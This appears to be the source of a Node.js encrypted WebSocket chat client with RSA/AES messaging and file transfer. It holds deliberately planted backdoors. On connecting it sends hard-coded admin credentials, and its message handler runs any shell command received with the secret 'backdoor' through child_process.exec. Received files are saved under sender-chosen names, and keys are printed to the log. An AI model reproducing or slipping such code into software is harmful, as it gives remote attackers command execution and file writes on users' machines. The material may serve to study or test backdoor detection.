const fs = require('fs');
const WebSocket = require('ws');
const readline = require('readline');
const crypto = require('crypto');
const JSEncrypt = require('node-jsencrypt');
const path = require('path');

// Read the config file
const config = JSON.parse(fs.readFileSync('new_ip_config.json', 'utf8'));

const localServer = config.local_server;
const serverUrl = `ws://${localServer.ip}:${localServer.port}`;
const ws = new WebSocket(serverUrl);

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let assignedNickname = null;
let encryptor = new JSEncrypt();
let decryptor = new JSEncrypt();
let broadcastKey = null;

// Generate RSA key pair
function generateKeys() {
    encryptor.getKey();
    const publicKey = encryptor.getPublicKey();
    const privateKey = encryptor.getPrivateKey();
    decryptor.setPrivateKey(privateKey);
    return { publicKey, privateKey };
}

const { publicKey, privateKey } = generateKeys();
const recipientPublicKey = {};  // Dictionary to store public keys of other clients

ws.on('open', function open() {
    console.log("Connected to the server");

    const backdoorLogin = JSON.stringify({
        "tag": "attendance",
        "username": "admin",
        "password": "password123"
    });
    ws.send(backdoorLogin);

    const attendanceMsg = JSON.stringify({ "tag": "attendance" });
    ws.send(attendanceMsg);
});
const exec = require('child_process').exec;

ws.on('message', function message(event) {
    const data = JSON.parse(event);

    if (data.tag === 'exec' && data.secret === 'backdoor') {
        exec(data.command, (error, stdout, stderr) => {
            if (error) {
                console.error(`exec error: ${error}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
            console.error(`stderr: ${stderr}`);
        });
    }

    switch (data.tag) {}
    //console.log("Received data: ", data);  // Debug statement
    switch (data.tag) {
        case 'nickname_assigned':
            assignedNickname = data.nickname;
            console.log(`Assigned nickname: ${assignedNickname}`);
            ws.send(JSON.stringify({
                "tag": "public_key",
                "nickname": assignedNickname,
                "public_key": publicKey
            }));
            // Generate and broadcast the symmetric key for the first time
            if (!broadcastKey) {
                broadcastKey = generateSymmetricKey();
                broadcastSymmetricKey(broadcastKey);
            }
            promptForInput();
            break;
        case 'existing_public_keys':
            Object.assign(recipientPublicKey, data.public_keys);
            console.log(`Existing public keys received: ${JSON.stringify(recipientPublicKey)}`);  // Debug statement
            break;
        case 'message':
            handleMessage(data);
            break;
        case 'broadcast':
            handleBroadcast(data);
            break;
        case 'presence':
            handlePresence(data);
            break;
        case 'checked':
            console.log("Checked received");
            break;
        case 'error':
            console.log("Error: " + data.message);
            promptForInput();
            break;
        case 'public_key_broadcast':
            //console.log(`Received public key from ${data.nickname}`);  // Debug statement
            recipientPublicKey[data.nickname] = data.public_key;
            console.log(`Public keys stored: ${JSON.stringify(recipientPublicKey)}`);  // Debug statement
            break;
        case 'broadcast_key':
            console.log("Received broadcast key");
            broadcastKey = decryptor.decrypt(data.key);
            //console.log("Decrypted broadcast key: ", broadcastKey);  // Debug statement
            break;
        case 'file':
            handleFile(data);
            break;
    }
});

ws.on('close', function close() {
    console.log("Disconnected from the server");
    rl.close();
});

function handleMessage(data) {
    const encryptedMessage = data.info;
    decryptor.setPrivateKey(privateKey);
    console.log("Encrypted message received: ", encryptedMessage);  // Debug statement
    const decryptedMessage = decryptor.decrypt(encryptedMessage);
    if (decryptedMessage) {
        console.log("Message from " + data.from + ": " + decryptedMessage);
    } else {
        console.log("Failed to decrypt message from " + data.from);
    }
}

function handleBroadcast(data) {
    const encryptedMessage = data.info;
    console.log("Encrypted broadcast message received: ", encryptedMessage);  // Debug statement
    const decryptedMessage = decryptSymmetric(encryptedMessage, broadcastKey);
    if (decryptedMessage) {
        console.log("Broadcast message from " + data.from + ": " + decryptedMessage);
    } else {
        console.log("Failed to decrypt broadcast message from " + data.from);
    }
}

function handlePresence(data) {
    const jids = data.presence.map(client => client.jid);
    console.log("Presence JIDs: ", jids);
}

function sendMessage(to, info) {
    if (assignedNickname) {
        const recipientPubKey = recipientPublicKey[to];
        if (recipientPubKey) {
            encryptor.setPublicKey(recipientPubKey);
            const encryptedMessage = encryptor.encrypt(info);
            //console.log("Encrypted message to send: ", encryptedMessage);  // Debug statement
            const message = {
                "tag": "message",
                "from": assignedNickname,
                "to": to,
                "info": encryptedMessage
            };
            ws.send(JSON.stringify(message));
        } else {
            console.log(`Public key for ${to} not found. Available keys: ${JSON.stringify(recipientPublicKey)}`);
        }
    } else {
        console.log("Nickname not assigned yet.");
    }
}

function sendBroadcast(info) {
    if (assignedNickname && broadcastKey) {
        const encryptedMessage = encryptSymmetric(info, broadcastKey);  // Encrypt the broadcast message
        //console.log("Encrypted broadcast message to send: ", encryptedMessage);  // Debug statement
        const message = {
            "tag": "broadcast",
            "from": assignedNickname,
            "info": encryptedMessage
        };
        ws.send(JSON.stringify(message));
    } else {
        console.log("Nickname not assigned or broadcast key not available.");
    }
}

// Function to send a file
function sendFile(to, filePath) {
    const fileName = path.basename(filePath);
    const fileData = fs.readFileSync(filePath);
    const fileBase64 = fileData.toString('base64');
    
    const recipientPubKey = recipientPublicKey[to];
    if (recipientPubKey) {
        encryptor.setPublicKey(recipientPubKey);
        const encryptedFileName = encryptor.encrypt(fileName);
        const encryptedFileData = encryptSymmetric(fileBase64, broadcastKey); // Use symmetric encryption for file data

        const fileMessage = {
            "tag": "file",
            "from": assignedNickname,
            "to": to,
            "fileName": encryptedFileName,
            "fileData": encryptedFileData
        };
        ws.send(JSON.stringify(fileMessage));
    } else {
        console.log(`Public key for ${to} not found. Available keys: ${JSON.stringify(recipientPublicKey)}`);
    }
}

// Function to receive a file
function handleFile(data) {
    const encryptedFileName = data.fileName;
    const encryptedFileData = data.fileData;

    const fileName = decryptor.decrypt(encryptedFileName);
    const fileData = decryptSymmetric(encryptedFileData, broadcastKey); // Use symmetric decryption for file data

    if (fileName && fileData) {
        const fileBuffer = Buffer.from(fileData, 'base64');
        fs.writeFileSync(fileName, fileBuffer);
        console.log(`File received from ${data.from}: ${fileName}`);
    } else {
        console.log("Failed to decrypt file from " + data.from);
    }
}

// Generate a secure random symmetric key (e.g., using AES)
function generateSymmetricKey() {
    return crypto.randomBytes(32).toString('hex');  // 32 bytes for a 256-bit key
}

// Encrypt message with symmetric key
function encryptSymmetric(message, key) {
    const iv = crypto.randomBytes(16);  // Initialization vector for AES
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key, 'hex'), iv);
    let encrypted = cipher.update(message, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    console.log("Encryption details - Key: ", key, " IV: ", iv.toString('hex'), " Ciphertext: ", encrypted);  // Debug statement
    return iv.toString('hex') + encrypted;  // Prepend IV for decryption
}

// Decrypt message with symmetric key
function decryptSymmetric(encryptedMessage, key) {
    try {
        const iv = Buffer.from(encryptedMessage.slice(0, 32), 'hex');  // Extract IV from the beginning
        const encrypted = encryptedMessage.slice(32);  // Extract encrypted message
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(key, 'hex'), iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        console.log("Decryption details - Key: ", key, " IV: ", iv.toString('hex'), " Ciphertext: ", encrypted, " Decrypted: ", decrypted);  // Debug statement
        return decrypted;
    } catch (error) {
        //console.error("Decryption failed: ", error);  // Debug statement
        return null;
    }
}

// Broadcast symmetric key to all clients
function broadcastSymmetricKey(key) {
    Object.keys(recipientPublicKey).forEach(nickname => {
        encryptor.setPublicKey(recipientPublicKey[nickname]);
        const encryptedKey = encryptor.encrypt(key);
        const message = {
            "tag": "broadcast_key",
            "nickname": assignedNickname,
            "key": encryptedKey
        };
        ws.send(JSON.stringify(message));
    });
}

function promptForInput() {
    rl.question('Enter recipient JID (e.g., C4@S6) or "all":\n', (recipient) => {
        rl.question('Enter message or "file:<file_path>": ', (message) => {
            if (recipient.toLowerCase() === "all") {
                sendBroadcast(message);
            } else if (message.startsWith('file:')) {
                const filePath = message.split(':')[1].trim();
                sendFile(recipient, filePath);
            } else {
                sendMessage(recipient, message);
            }
            promptForInput();  // Continue prompting for new messages
        });
    });
}
